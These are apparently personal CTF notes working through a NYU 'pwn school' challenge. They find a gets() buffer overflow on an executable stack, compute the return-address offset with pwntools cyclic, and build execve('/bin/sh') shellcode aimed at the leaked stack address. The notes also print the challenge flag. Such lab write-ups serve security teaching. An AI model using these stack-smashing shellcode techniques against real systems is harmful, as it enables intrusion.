Location: `nc offsec-chalbroker.osiris.cyber.nyu.edu 1338`
Download: `school`
Flag: `flag{first_day_of_pwn_school}`
###### First Run:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ ./school      
Let's go to school! School's at: 0x7ffcfdb98500. gimme directions:
Skip school!
Hi, Skip school!
```
###### You know I had to try it:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ ./school
Let's go to school! School's at: 0x7ffd79eaaa30. gimme directions:
0x7ffcfdb98500
Hi, 0x7ffcfdb98500
```
###### Main Method:
```c
undefined8 main(EVP_PKEY_CTX *param_1){
  char data [32];
  init(param_1);
  printf("Let\'s go to school! School\'s at: %p. gimme directions:\n",data);
  gets(data);
  printf("Hi, %s\n",data);
  return 0;
}
```
Expects 32 char of input

###### Main Assembly:
```
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000400631 <+0>:     push   rbp
   0x0000000000400632 <+1>:     mov    rbp,rsp
   0x0000000000400635 <+4>:     sub    rsp,0x20
   0x0000000000400639 <+8>:     mov    eax,0x0
   0x000000000040063e <+13>:    call   0x40060d <init>
   0x0000000000400643 <+18>:    lea    rax,[rbp-0x20]
   0x0000000000400647 <+22>:    mov    rsi,rax
   0x000000000040064a <+25>:    mov    edi,0x400718
   0x000000000040064f <+30>:    mov    eax,0x0
   0x0000000000400654 <+35>:    call   0x4004d0 <printf@plt>
   0x0000000000400659 <+40>:    lea    rax,[rbp-0x20]
   0x000000000040065d <+44>:    mov    rdi,rax
   0x0000000000400660 <+47>:    call   0x400500 <gets@plt>
   0x0000000000400665 <+52>:    lea    rax,[rbp-0x20]
   0x0000000000400669 <+56>:    mov    rsi,rax
   0x000000000040066c <+59>:    mov    edi,0x400750
   0x0000000000400671 <+64>:    mov    eax,0x0
   0x0000000000400676 <+69>:    call   0x4004d0 <printf@plt>
   0x000000000040067b <+74>:    mov    eax,0x0
   0x0000000000400680 <+79>:    leave
   0x0000000000400681 <+80>:    ret
End of assembler dump.
```
###### The stack is executable though, that should never happen
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ ~/.local/bin/pwn checksec ./school    
[*] '/home/kali/Desktop/5-Week/school'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```
I don't have any fucking clue what `GNU_STACK missing` means and I am praying that I can avoid finding out
The `rwx` means that some parts of the program can be read, written, and executed, which is a bad choice on their part
###### Vmmap
```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/kali/Desktop/5-Week/school
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/kali/Desktop/5-Week/school
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/kali/Desktop/5-Week/school
0x00007ffff7dc8000 0x00007ffff7dcb000 0x0000000000000000 rw- 
0x00007ffff7dcb000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7df1000 0x00007ffff7f46000 0x0000000000026000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f46000 0x00007ffff7f9a000 0x000000000017b000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f9a000 0x00007ffff7f9e000 0x00000000001cf000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f9e000 0x00007ffff7fa0000 0x00000000001d3000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7fa0000 0x00007ffff7fad000 0x0000000000000000 rw- 
0x00007ffff7fc3000 0x00007ffff7fc5000 0x0000000000000000 rw- 
0x00007ffff7fc5000 0x00007ffff7fc9000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc9000 0x00007ffff7fcb000 0x0000000000000000 r-x [vdso]
0x00007ffff7fcb000 0x00007ffff7fcc000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7fcc000 0x00007ffff7ff1000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ff1000 0x00007ffff7ffb000 0x0000000000026000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000030000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000032000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rwx [stack]
```
###### The important part of vmap
```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/kali/Desktop/5-Week/school
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/kali/Desktop/5-Week/school
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/kali/Desktop/5-Week/school

0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rwx [stack]
```
I love this for me
###### My guess is, with no stack canary, the plan is as follows:
1) Write something we want to execute to the stack
	* I think it HAS to be in assembly though
2) Overflow the stack so that when `main` returns it tries to execute whatever is in the stack
###### For the executable code, I feel like I can just "borrow" the assembly of `run_cmd` in `git_got_good`
```
gef➤  disas run_cmd
Dump of assembler code for function run_cmd:
   0x000000000040074b <+0>:     push   rbp
   0x000000000040074c <+1>:     mov    rbp,rsp
   0x000000000040074f <+4>:     sub    rsp,0x10
   0x0000000000400753 <+8>:     mov    QWORD PTR [rbp-0x8],rdi
   0x0000000000400757 <+12>:    mov    rax,QWORD PTR [rbp-0x8]
   0x000000000040075b <+16>:    mov    rdi,rax
   0x000000000040075e <+19>:    mov    eax,0x0
   0x0000000000400763 <+24>:    call   0x4005d0 <system@plt>
   0x0000000000400768 <+29>:    nop
   0x0000000000400769 <+30>:    leave
   0x000000000040076a <+31>:    ret
End of assembler dump.
```
However, I don't see system as something imported here

Well, that's all good food for thought...now onto seeing what happens if we put in too much input:
## Segfault
###### Rip Offset Code:
```python
def ripOffset():
	p = process('./school')
	d = p.recvuntil("directions:")
	p.sendline(cyclic(100))
	p.wait()
	cf = p.corefile
	stack = cf.rsp
	info("rsp = %#x", stack)
	pattern = cf.read(stack, 4)
	ripOffset = cyclic_find(pattern)
	info("rip offset = %d", ripOffset)
```
Results:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 School_Pwn1.py
[+] Starting local process './school': pid 1284615
/home/kali/Desktop/5-Week/School_Pwn1.py:28: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  d = p.recvuntil("directions:")
[*] Process './school' stopped with exit code -11 (SIGSEGV) (pid 1284615)
[+] Parsing corefile...: Done
[*] '/home/kali/Desktop/5-Week/core.1284615'
    Arch:      amd64-64-little
    RIP:       0x400681
    RSP:       0x7ffe9fe27878
    Exe:       '/home/kali/Desktop/5-Week/school' (0x400000)
    Fault:     0x6161616c6161616b
[*] rsp = 0x7ffe9fe27878
[*] rip offset = 40
```

So we can see that at `0x400681`, the program tries to access memory from `0x6161616c6161616b`, which is 40 chars into the user input
###### Registers
```
$rax   : 0x0               
$rbx   : 0x00007fffffffdf08  →  0x00007fffffffe27a  →  "/home/kali/Desktop/5-Week/school"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007fffffffddf8  →  "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00007fffffffdc20  →  "Hi, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaala[...]"
$rdi   : 0x00007fffffffdbf0  →  0x00007fffffffdc20  →  "Hi, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaala[...]"
$rip   : 0x0000000000400681  →  <main+80> ret 
$r8    : 0x73              
$r9    : 0x1               
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdf18  →  0x00007fffffffe29b  →  "SHELL=/usr/bin/zsh"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000
```
###### Stack:
```
0x00007fffffffddf8│+0x0000: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"     ← $rsp
0x00007fffffffde00│+0x0008: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0x00007fffffffde08│+0x0010: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffde10│+0x0018: "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffde18│+0x0020: "saaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffde20│+0x0028: "uaaavaaawaaaxaaayaaa"
0x00007fffffffde28│+0x0030: "waaaxaaayaaa"
0x00007fffffffde30│+0x0038: 0x0000000061616179 ("yaaa"?)
```
###### Where in Code:
```
     0x400676 <main+69>        call   0x4004d0 <printf@plt>
     0x40067b <main+74>        mov    eax, 0x0
     0x400680 <main+79>        leave  
 →   0x400681 <main+80>        ret  
```

So this happened at when `main` tried to pop a value of the stack and `return`
I think then, by putting a stack address at the 40th character, it will try to return to that and run

##### Calculating Offset In Another Way
###### Initialize input variable and run code
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ pwn cyclic 100 > inp
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ gdb ./school -q     
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 13.2 in 0.00ms using Python engine 3.11
Reading symbols from ./school...
(No debugging symbols found in ./school)
gef➤  r < inp
Starting program: /home/kali/Desktop/5-Week/school < inp
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Let's go to school! School's at: 0x7fffffffddb0. gimme directions:
Hi, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Program received signal SIGSEGV, Segmentation fault.
```
###### Registers:
```
$rax   : 0x0               
$rbx   : 0x00007fffffffdee8  →  0x00007fffffffe250  →  "/home/kali/Desktop/5-Week/school"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x00007fffffffddd8  →  "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x00007fffffffdc00  →  "Hi, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaala[...]"
$rdi   : 0x00007fffffffdbd0  →  0x00007fffffffdc00  →  "Hi, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaala[...]"
$rip   : 0x0000000000400681  →  <main+80> ret 
$r8    : 0x73              
$r9    : 0x1               
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x00007fffffffdef8  →  0x00007fffffffe271  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x00007ffff7ffd000  →  0x00007ffff7ffe2d0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
```
###### Stack:
```
0x00007fffffffddd8│+0x0000: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"    ← $rsp
0x00007fffffffdde0│+0x0008: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0x00007fffffffdde8│+0x0010: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffddf0│+0x0018: "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffddf8│+0x0020: "saaataaauaaavaaawaaaxaaayaaa"
0x00007fffffffde00│+0x0028: "uaaavaaawaaaxaaayaaa"
0x00007fffffffde08│+0x0030: "waaaxaaayaaa"
0x00007fffffffde10│+0x0038: 0x0000000061616179 ("yaaa"?)
```
###### `rbp` = `0x6161616a61616169` ("iaaajaaa"?)
```python
──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3                 
>>> from pwn import *
>>> cyclic_find('iaaa')
32
```
So the 32nd input ends up overwriting `rbp` (maybe due to the leave command?)
###### And the top of the stack starts with "kaaa"
```python
>>> cyclic_find('kaaa')
40
```
Confirming where we are segfaulting

Now if this program loaded in anything good, I would use this to call that BUT IT DOESN'T so now I have to make code that will execute and put it on the stack...gross

Though the problem is, I need to make sure it calls an address on the stack...and those change
Wait, it did give us that address
###### Address offset
```
──(kali㉿kali)-[~/Desktop/5-Week]
└─$ pwn cyclic 100 > inp
 ┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ gdb ./school -q
gef➤  r < inp
Let's go to school! School's at: 0x7fffffffddb0. gimme directions:
Hi, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
gef➤  x 0x7fffffffddb0
Program received signal SIGSEGV, Segmentation fault.
0x0000000000400681 in main ()
0x7fffffffddb0: 0x61616161
```
We KNOW that's the first line but...just to be sure:
```
>>> cyclic_find(b'\x61\x61\x61\x61')
0
```

# Shellcode Using Shellcraft
Pwntools has a handy-dandy little tool for making this shit
....will it fit in the buffer???? (I'm thinking no)
###### Build and print shllcode:
```python
def scraftPld():
	# Set up shellcode
	print(shellcraft.sh())
	sCode = asm(shellcraft.sh())
	print(sCode)
	print("Shellcode Length = ", len(sCode))
```
###### Results:
```
┌──(kali㉿kali)-[~/Desktop/5-Week]
└─$ python3 School_Pwn1.py
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80

b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
Shellcode Length =  44
```

So already, our shellcode is longer than the buffer.
There are ways around it but...hmmm


Okay, for glory's sake...what happens if we just send it our shellcode?
```python
def scraftPld():
	# Set up shellcode
	sCode = asm(shellcraft.sh())
	# Calculate the remaining buffer room
	#rem = 39 - len(sCode)
	#print("rem = ", rem)
	#pad = b'A'*rem
	addr = p64(0x7fffffffddb0)
	#return sCode + pad + addr
	return sCode + addr

def testPld():
	p =  process('/bin/bash')
	p.sendline('gdb ./school -q')
	p.sendline("r")
	p.recvuntil("directions:")
	p.sendline(scraftPld())
	p.interactive()
```
###### Results:
```
[*] Switching to interactive mode

Hi, jhh///sh/bin\x89\xe3h\x814$ri1\xc9Qj\x04Y\xe1Q\x89\xe11\xd2j\x0bX\xb0\xdd\xff\xff\xff\x7f

Program received signal SIGSEGV, Segmentation fault.
0xffffddb080cd580b in ?? ()
```

###### Ignore this
```python
>>> print(shellcraft.sh())
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80

>>> sCode = asm(shellcraft.sh())
>>> print(sCode)
b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
>>> print("Shellcode Length = ", len(sCode))
Shellcode Length =  44
```